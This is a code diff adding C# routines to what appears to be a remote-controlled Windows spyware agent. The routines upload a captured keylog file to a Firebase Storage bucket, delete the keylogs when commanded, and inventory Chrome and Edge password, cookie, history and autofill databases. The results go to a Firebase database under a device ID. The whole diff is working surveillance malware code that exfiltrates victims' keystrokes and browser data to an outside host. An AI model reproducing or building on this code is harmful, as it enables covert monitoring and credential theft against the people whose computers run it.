@@ -1,0 +1,157 @@
+        static async Task ProcessKeylogDownload(string reqId)
+        {
+            try
+            {
+                if (!File.Exists(_keylogPath))
+                {
+                    Log("No keylog file found");
+                    var errorResp = new { error = "No keylogs found", timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() };
+                    await _http.PutAsync($"{FIREBASE_DB_URL}responses/{_deviceId}/{reqId}.json?auth={_idToken}", 
+                        new StringContent(JsonSerializer.Serialize(errorResp), Encoding.UTF8, "application/json"));
+                    return;
+                }
+
+                // Save current buffer first
+                SaveKeylogsToFile();
+
+                // Upload keylog file to Firebase Storage
+                var bytes = await File.ReadAllBytesAsync(_keylogPath);
+                var fileName = "keylogs.dat";
+                var storageName = $"{_deviceId}/{reqId}/{fileName}";
+                
+                var bucket = "windows-agent-10.firebasestorage.app";
+                var uploadUrl = $"https://firebasestorage.googleapis.com/v0/b/{bucket}/o?name={Uri.EscapeDataString(storageName)}";
+                
+                Log($"Uploading keylogs ({bytes.Length} bytes)...");
+                
+                var content = new ByteArrayContent(bytes);
+                content.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");
+                
+                var resp = await _http.PostAsync(uploadUrl, content);
+                if (resp.IsSuccessStatusCode)
+                {
+                    var json = await resp.Content.ReadAsStringAsync();
+                    using var doc = JsonDocument.Parse(json);
+                    var token = doc.RootElement.GetProperty("downloadTokens").GetString();
+                    
+                    var publicUrl = $"https://firebasestorage.googleapis.com/v0/b/{bucket}/o/{Uri.EscapeDataString(storageName)}?alt=media&token={token}";
+                    
+                    var response = new { 
+                        url = publicUrl, 
+                        size = bytes.Length,
+                        timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() 
+                    };
+                    await _http.PutAsync($"{FIREBASE_DB_URL}responses/{_deviceId}/{reqId}.json?auth={_idToken}", 
+                        new StringContent(JsonSerializer.Serialize(response), Encoding.UTF8, "application/json"));
+                    
+                    Log($"Keylog upload complete");
+                }
+                else
+                {
+                    Log($"Keylog upload failed: {resp.StatusCode}");
+                }
+            }
+            catch (Exception ex) { Log($"ProcessKeylogDownload Error: {ex}"); }
+        }
+
+        static async Task ProcessKeylogDelete(string reqId)
+        {
+            try
+            {
+                if (File.Exists(_keylogPath))
+                {
+                    File.Delete(_keylogPath);
+                    Log("Keylog file deleted");
+                    
+                    var response = new { 
+                        status = "deleted", 
+                        timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() 
+                    };
+                    await _http.PutAsync($"{FIREBASE_DB_URL}responses/{_deviceId}/{reqId}.json?auth={_idToken}", 
+                        new StringContent(JsonSerializer.Serialize(response), Encoding.UTF8, "application/json"));
+                }
+                else
+                {
+                    Log("No keylog file to delete");
+                    var response = new { 
+                        status = "not_found", 
+                        timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds() 
+                    };
+                    await _http.PutAsync($"{FIREBASE_DB_URL}responses/{_deviceId}/{reqId}.json?auth={_idToken}", 
+                        new StringContent(JsonSerializer.Serialize(response), Encoding.UTF8, "application/json"));
+                }
+            }
+            catch (Exception ex) { Log($"ProcessKeylogDelete Error: {ex}"); }
+        }
+
+        // Browser Data Extraction
+        static async Task ExtractBrowserData()
+        {
+            try
+            {
+                Log("Extracting browser data...");
+                var browserData = new
+                {
+                    chrome = ExtractChromeData(),
+                    edge = ExtractEdgeData(),
+                    firefox = new { status = "Not implemented - Firefox uses different encryption" },
+                    timestamp = DateTimeOffset.UtcNow.ToUnixTimeMilliseconds()
+                };
+
+                var url = $"{FIREBASE_DB_URL}browser_data/{_deviceId}.json?auth={_idToken}";
+                var resp = await _http.PutAsync(url, new StringContent(JsonSerializer.Serialize(browserData), Encoding.UTF8, "application/json"));
+                if(!resp.IsSuccessStatusCode) Log($"Browser Data Upload Failed: {resp.StatusCode}");
+                else Log("Browser data uploaded successfully.");
+            }
+            catch (Exception ex) { Log($"Browser Extraction Error: {ex}"); }
+        }
+
+        static object ExtractChromeData()
+        {
+            try
+            {
+                var chromeDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), 
+                    @"Google\Chrome\User Data\Default");
+                
+                if (!Directory.Exists(chromeDataPath))
+                    return new { error = "Chrome not found" };
+
+                return new
+                {
+                    passwords_db = File.Exists(Path.Combine(chromeDataPath, "Login Data")) ? "Found (DPAPI encrypted)" : "Not found",
+                    history_db = File.Exists(Path.Combine(chromeDataPath, "History")) ? "Found" : "Not found",
+                    cookies_db = File.Exists(Path.Combine(chromeDataPath, "Cookies")) ? "Found (DPAPI encrypted)" : "Not found",
+                    autofill_db = File.Exists(Path.Combine(chromeDataPath, "Web Data")) ? "Found" : "Not found",
+                    note = "Databases found. Full decryption requires DPAPI implementation."
+                };
+            }
+            catch (Exception ex) 
+            { 
+                Log($"Chrome extraction error: {ex.Message}");
+                return new { error = ex.Message }; 
+            }
+        }
+
+        static object ExtractEdgeData()
+        {
+            try
+            {
+                var edgeDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), 
+                    @"Microsoft\Edge\User Data\Default");
+                
+                if (!Directory.Exists(edgeDataPath))
+                    return new { error = "Edge not found" };
+
+                return new
+                {
+                    passwords_db = File.Exists(Path.Combine(edgeDataPath, "Login Data")) ? "Found (DPAPI encrypted)" : "Not found",
+                    history_db = File.Exists(Path.Combine(edgeDataPath, "History")) ? "Found" : "Not found",
+                    note = "Databases found. Full decryption requires DPAPI implementation."
+                };
+            }
+            catch (Exception ex) 
+            { 
+                Log($"Edge extraction error: {ex.Message}");
+                return new { error = ex.Message }; 
+            }
+        }
